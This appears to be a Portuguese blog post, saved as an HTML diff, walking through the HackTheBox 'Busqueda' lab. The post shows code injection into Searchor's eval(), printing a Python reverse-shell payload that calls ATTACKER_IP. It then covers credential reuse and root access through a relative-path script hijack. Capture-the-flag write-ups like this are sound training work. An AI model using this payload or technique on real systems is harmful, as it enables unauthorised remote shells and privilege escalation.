@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HackTheBox - Busqueda | tomiodarim</title>
+<meta name="keywords" content="write-up, hackthebox, machine, busqueda">
+<meta name="description" content="Busqueda é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código na aplicação web para obter acesso como usuário svc, então por reuso de credenciais conseguir certas permissões para executar códigos como root.
+Com um scan do nmap encontra-se duas portas abertas nessa máquina, 80 de uma aplicação web e 22 de ssh. O servidor http redireciona para o domínio searcher.htb, então precisa-se adicioná-lo ao arquivo hosts local.">
+<meta name="author" content="Lucas Tomio Darim">
+<link rel="canonical" href="https://tomiodarim.io/posts/htb-busqueda/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5a101feaed2bc000d60de8365173a1aa6c75665853dcc863f92f59ea5ace5d74.css" integrity="sha256-WhAf6u0rwADWDeg2UXOhqmx1ZlhT3Mhj&#43;S9Z6lrOXXQ=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.20cbcab8eadb4b1c256e6db331b0130fc305cd882d8b91865e9b6473e8ec5c24.js" integrity="sha256-IMvKuOrbSxwlbm2zMbATD8MFzYgti5GGXptkc&#43;jsXCQ="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://tomiodarim.io/images/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://tomiodarim.io/images/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tomiodarim.io/images/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://tomiodarim.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://tomiodarim.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="HackTheBox - Busqueda" />
+<meta property="og:description" content="Busqueda é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código na aplicação web para obter acesso como usuário svc, então por reuso de credenciais conseguir certas permissões para executar códigos como root.
+Com um scan do nmap encontra-se duas portas abertas nessa máquina, 80 de uma aplicação web e 22 de ssh. O servidor http redireciona para o domínio searcher.htb, então precisa-se adicioná-lo ao arquivo hosts local." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tomiodarim.io/posts/htb-busqueda/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-08-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-08-12T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox - Busqueda"/>
+<meta name="twitter:description" content="Busqueda é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código na aplicação web para obter acesso como usuário svc, então por reuso de credenciais conseguir certas permissões para executar códigos como root.
+Com um scan do nmap encontra-se duas portas abertas nessa máquina, 80 de uma aplicação web e 22 de ssh. O servidor http redireciona para o domínio searcher.htb, então precisa-se adicioná-lo ao arquivo hosts local."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://tomiodarim.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox - Busqueda",
+      "item": "https://tomiodarim.io/posts/htb-busqueda/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HackTheBox - Busqueda",
+  "name": "HackTheBox - Busqueda",
+  "description": "Busqueda é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código na aplicação web para obter acesso como usuário svc, então por reuso de credenciais conseguir certas permissões para executar códigos como root.\nCom um scan do nmap encontra-se duas portas abertas nessa máquina, 80 de uma aplicação web e 22 de ssh. O servidor http redireciona para o domínio searcher.htb, então precisa-se adicioná-lo ao arquivo hosts local.",
+  "keywords": [
+    "write-up", "hackthebox", "machine", "busqueda"
+  ],
+  "articleBody": "Busqueda é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código na aplicação web para obter acesso como usuário svc, então por reuso de credenciais conseguir certas permissões para executar códigos como root.\nCom um scan do nmap encontra-se duas portas abertas nessa máquina, 80 de uma aplicação web e 22 de ssh. O servidor http redireciona para o domínio searcher.htb, então precisa-se adicioná-lo ao arquivo hosts local.\nA aplicação web é uma ferramenta de busca, na qual se pode escolher uma engine e escrever o que se quer buscar. E ao clicar em search é retornado uma URL para essa busca na engine escolhida ou é redirecionado para essa URL caso a opção “Auto redirect” esteja selecionada.\nNo footer da página nos é informado que esta foi desenvolvida utilizando o framework Flask e a biblioteca Searchor na versão 2.4.0.\nAo pesquisar por vulnerabilidades dessa versão do Searchor, encontra-se um report do snyk, que pode ser acessado nesse link. Para fazer a busca é utilizado o método eval() passando como parâmetros as entradas do usuário sem fazer nenhum tipo de sanitização. Dessa forma, é possível a execução de códigos arbitrários no servidor através da entrada de códigos python onde deveria ser inserido uma string que se deseja buscar.\nNo github do usuário jonnyzar há o seguinte PoC para se obter uma reverse shell por meio dessa vulnerabilidade, POC-Seachor-2.4.2. Para utilizar esse PoC, precisa alterar o “ATTACKER_IP” e “PORT” para o endereço IP e a porta da máquina atacante.\n', exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"))# Com o uso desse código, eu obtive uma shell como usuário svc. Na home do svc já encontra-se a flag de usuário.\nNa pasta da aplicação web, a pasta inicial ao conseguir a reverse shell, há um diretório de git com um arquivo de configurações. Nesse arquivo há um usuário e senha para uma outra aplicação web em um subdomínio do searcher.htb. Para acessá-lo precisamos, também, adicioná-lo ao hosts.\nAo logar com as credenciais encontradas, podemos ver um repositório contendo o código-fonte do site de busca e encontramos um outro usuário, chamado administrator.\nCom a mesma senha do cody podemos executar o comando “sudo -l” para ver quais comando o svc pode executar com sudo. Que nesse caso pode executar como root o script de python “system-checkup.py” passando quaisquer parâmetros. Na pasta em que esse script está armazenado também há outros três, todos pertencentes ao root, mas o usuário svc só possui permissão para executar o system-checkup.\nO system-checkup tem como forma de uso a escolha de uma ação seguida por possíveis argumentos. Se escolhermos o docker-ps é retornado os dados relacionados aos containers. Com o docker-inspect somos informados que precisa ser passado como argumento um formato e o nome de um container. Já como o full-checkup é retornado uma mensagem de que algo deu errado.\nPesquisando pela documentação do docker inspect dá para ter uma noção de como executar o script. Então passando como argumento de formato ‘{{json .Config}}’ e como nome de container um id, que conseguimos com o docker-ps, obtemos as configurações relacionadas ao container. E nessas configurações há uma senha.\nCom essa senha podemos acessar o gitea do usuário administrator. Sendo que este possui um outro repositório, chamado scripts, que contém o código dos scripts que encontramos anteriormente mas não tínhamos a permissão necessária para lê-los.\nA ação de full-checkup do “system-checkup.py” que antes retornava uma mensagem de erros tem o seguinte código:\n... elif action == 'full-checkup': try: arg_list = ['./full-checkup.sh'] print(run_command(arg_list)) print('[+] Done!') except: print('Something went wrong') exit(1) ... Como pode ser visto, será tentado executar um segundo script chamado “full-checkup.sh” que está na mesma pasta e caso não seja possível retorna o erro que obtivemos. Como o caminho para esse segundo script é relativo, podemos criar um com o mesmo nome em outra pasta com um código arbitrário que será, então, executado como root. Portanto, eu criei o seguinte arquivo no diretório tmp com o nome “full-checkup.sh”.\n#!/bin/bash cat /root/root.txt Esse código só escreve a flag do root no terminal. Mas poderia ser qualquer outra coisa, como uma reverse shell com privilégios de root. Com isso, obtive a flag de root ao executar o system-checkup com a ação de full-checkup estando na pasta tmp.\n",
+  "wordCount" : "712",
+  "inLanguage": "pt",
+  "datePublished": "2023-08-12T00:00:00Z",
+  "dateModified": "2023-08-12T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Lucas Tomio Darim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://tomiodarim.io/posts/htb-busqueda/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "tomiodarim",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://tomiodarim.io/images/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://tomiodarim.io/" accesskey="h" title="tomiodarim (Alt + H)">tomiodarim</a>
+            
+        </div>
+        <div class="logo">
+            <ul id="menu">
+                <li>
+                    <a href="https://tomiodarim.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://tomiodarim.io/aboutme/" title="About Me">
+                        <span>About Me</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://tomiodarim.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+            </ul>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title">
+      HackTheBox - Busqueda
+    </h1>
+    <div class="post-meta"><span title='2023-08-12 00:00:00 +0000 UTC'>12 de agosto de 2023</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Busqueda é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código na aplicação web para obter acesso como usuário svc, então por reuso de credenciais conseguir certas permissões para executar códigos como root.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/0.png" alt="Busqueda Banner"  />
+</p>
+<hr>
+<p>Com um scan do nmap encontra-se duas portas abertas nessa máquina, 80 de uma aplicação web e 22 de ssh. O servidor http redireciona para o domínio searcher.htb, então precisa-se adicioná-lo ao arquivo hosts local.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/1.png" alt="Nmap"  />
+</p>
+<p>A aplicação web é uma ferramenta de busca, na qual se pode escolher uma engine e escrever o que se quer buscar. E ao clicar em search é retornado uma URL para essa busca na engine escolhida ou é redirecionado para essa URL caso a opção &ldquo;Auto redirect&rdquo; esteja selecionada.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/2.png" alt="Searcher"  />
+</p>
+<p>No footer da página nos é informado que esta foi desenvolvida utilizando o framework Flask e a biblioteca Searchor na versão 2.4.0.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/3.png" alt="Powered by"  />
+</p>
+<p>Ao pesquisar por vulnerabilidades dessa versão do Searchor, encontra-se um report do snyk, que pode ser acessado <a href="https://security.snyk.io/package/pip/searchor/2.4.0">nesse link</a>. Para fazer a busca é utilizado o método eval() passando como parâmetros as entradas do usuário sem fazer nenhum tipo de sanitização. Dessa forma, é possível a execução de códigos arbitrários no servidor através da entrada de códigos python onde deveria ser inserido uma string que se deseja buscar.</p>
+<p>No github do usuário jonnyzar há o seguinte PoC para se obter uma reverse shell por meio dessa vulnerabilidade, <a href="https://github.com/jonnyzar/POC-Searchor-2.4.2">POC-Seachor-2.4.2</a>. Para utilizar esse PoC, precisa alterar o &ldquo;ATTACKER_IP&rdquo; e &ldquo;PORT&rdquo; para o endereço IP e a porta da máquina atacante.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;, exec(&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;</span><span class="n">ATTACKER_IP</span><span class="s1">&#39;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#39;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="s1">&#39;,&#39;</span><span class="o">-</span><span class="n">i</span><span class="s1">&#39;]);&#34;))#</span>
+</span></span></code></pre></div><p>Com o uso desse código, eu obtive uma shell como usuário svc. Na home do svc já encontra-se a flag de usuário.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/4.png" alt="svc"  />
+</p>
+<p>Na pasta da aplicação web, a pasta inicial ao conseguir a reverse shell, há um diretório de git com um arquivo de configurações. Nesse arquivo há um usuário e senha para uma outra aplicação web em um subdomínio do searcher.htb. Para acessá-lo precisamos, também, adicioná-lo ao hosts.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/5.png" alt=".git/config"  />
+</p>
+<p>Ao logar com as credenciais encontradas, podemos ver um repositório contendo o código-fonte do site de busca e encontramos um outro usuário, chamado administrator.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/6.png" alt="gitea"  />
+</p>
+<p>Com a mesma senha do cody podemos executar o comando &ldquo;sudo -l&rdquo; para ver quais comando o svc pode executar com sudo. Que nesse caso pode executar como root o script de python &ldquo;system-checkup.py&rdquo; passando quaisquer parâmetros. Na pasta em que esse script está armazenado também há outros três, todos pertencentes ao root, mas o usuário svc só possui permissão para executar o system-checkup.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/7.png" alt="sudo"  />
+</p>
+<p>O system-checkup tem como forma de uso a escolha de uma ação seguida por possíveis argumentos. Se escolhermos o docker-ps é retornado os dados relacionados aos containers. Com o docker-inspect somos informados que precisa ser passado como argumento um formato e o nome de um container. Já como o full-checkup é retornado uma mensagem de que algo deu errado.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/8.png" alt="system-checkup"  />
+</p>
+<p>Pesquisando pela documentação do docker inspect dá para ter uma noção de como executar o script. Então passando como argumento de formato &lsquo;{{json .Config}}&rsquo; e como nome de container um id, que conseguimos com o docker-ps, obtemos as configurações relacionadas ao container. E nessas configurações há uma senha.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/9.png" alt="docker-inspect"  />
+</p>
+<p>Com essa senha podemos acessar o gitea do usuário administrator. Sendo que este possui um outro repositório, chamado scripts, que contém o código dos scripts que encontramos anteriormente mas não tínhamos a permissão necessária para lê-los.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/10.png" alt="administrator"  />
+</p>
+<p>A ação de full-checkup do &ldquo;system-checkup.py&rdquo; que antes retornava uma mensagem de erros tem o seguinte código:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="s1">&#39;full-checkup&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;./full-checkup.sh&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Done!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Something went wrong&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></div><p>Como pode ser visto, será tentado executar um segundo script chamado &ldquo;full-checkup.sh&rdquo; que está na mesma pasta e caso não seja possível retorna o erro que obtivemos. Como o caminho para esse segundo script é relativo, podemos criar um com o mesmo nome em outra pasta com um código arbitrário que será, então, executado como root. Portanto, eu criei o seguinte arquivo no diretório tmp com o nome &ldquo;full-checkup.sh&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>cat /root/root.txt
+</span></span></code></pre></div><p>Esse código só escreve a flag do root no terminal. Mas poderia ser qualquer outra coisa, como uma reverse shell com privilégios de root. Com isso, obtive a flag de root ao executar o system-checkup com a ação de full-checkup estando na pasta tmp.</p>
+<p><img loading="lazy" src="/images/htb-busqueda/11.png" alt="root.txt"  />
+</p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      tags:
+      <li><a href="https://tomiodarim.io/tags/write-up/">write-up</a></li>
+      <li><a href="https://tomiodarim.io/tags/hackthebox/">hackthebox</a></li>
+      <li><a href="https://tomiodarim.io/tags/machine/">machine</a></li>
+      <li><a href="https://tomiodarim.io/tags/busqueda/">busqueda</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>Lucas Tomio Darim · &copy; 2023</span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
